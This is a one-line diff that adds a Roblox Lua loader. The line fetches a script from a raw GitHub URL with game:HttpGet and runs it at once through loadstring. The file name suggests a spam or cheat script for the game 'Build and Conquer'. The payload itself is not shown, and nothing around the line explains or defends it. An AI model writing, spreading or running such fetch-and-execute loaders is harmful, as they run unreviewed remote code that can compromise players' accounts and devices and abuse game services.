@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/build-and-conquer-v0-1-spam1-scdtaijkl6t22q.lua"))()
